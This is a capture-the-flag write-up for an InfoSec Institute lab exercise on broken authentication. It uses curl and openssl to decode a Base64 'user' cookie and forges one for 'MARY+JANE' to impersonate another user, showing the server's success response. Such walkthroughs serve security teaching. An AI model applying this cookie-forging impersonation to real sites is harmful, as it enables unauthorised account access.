# A2 Broken Authentication and Session Management

1.	The hint *It seems you were automatically logged in* suggests us that
	something is (or should be) stored at client side. Let's try to take a look
	in the cookies

		$ curl -i http://ctf.infosecinstitute.com/ctf2/exercises/ex9.php
		HTTP/1.1 200 OK
		Date: Tue, 15 Sep 2015 08:40:18 GMT
		Server: Apache/2.4.7 (Ubuntu)
		X-Powered-By: PHP/5.5.9-1ubuntu4.6
		Set-Cookie: PHPSESSID=d309chl30f9toku705pl0s5gh5; path=/
		Expires: Thu, 19 Nov 1981 08:52:00 GMT
		Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
		Pragma: no-cache
		Set-Cookie: user=Sk9ITitET0U%3D; expires=Tue, 15-Sep-2015 09:40:18 GMT; Max-Age=3600; path=/; httponly
		Vary: Accept-Encoding
		Content-Length: 4701
		Content-Type: text/html

		<!doctype html>
		<html lang="en">
			<head>

		[...]

2.	What about `user=Sk9ITitET0U%3D`? It seems to be a Base64 string. Let's try
	to decode it

		$ echo "Sk9ITitET0U=" | openssl base64 -d
		JOHN+DOE

	Yep!

3.	We need to impersonate **Mary Jane**, so the cookie value should be

		$ echo -n "MARY+JANE" | openssl base64 -e
		TUFSWStKQU5F

4.	Let's try if everything works...

		$ curl -i --cookie "user=TUFSWStKQU5F" http://ctf.infosecinstitute.com/ctf2/exercises/ex9.php
		HTTP/1.1 200 OK
		Date: Tue, 15 Sep 2015 08:46:20 GMT
		Server: Apache/2.4.7 (Ubuntu)
		X-Powered-By: PHP/5.5.9-1ubuntu4.6

		[...]

			<h2 class="text-center">Hello, Mary Jane.</h2>
			<table class="table table-responsive table-striped">
				<tr>
					<th>Name</th>
					<th>Age</th>
					<th>Nationality</th>
				</tr>
				<tr>
						<td>Mary Jane</td>
						<td>18</td>
						<td>American</td>
				</tr>
			</table>.

		[...]

			   <p class="lead">Oh yeah, you actually made it! You know the drill.</p>

		[...]

	Nice! :-D


[Go to Ex8](./ex8.md) | [Go to Ex10](./ex10.md)

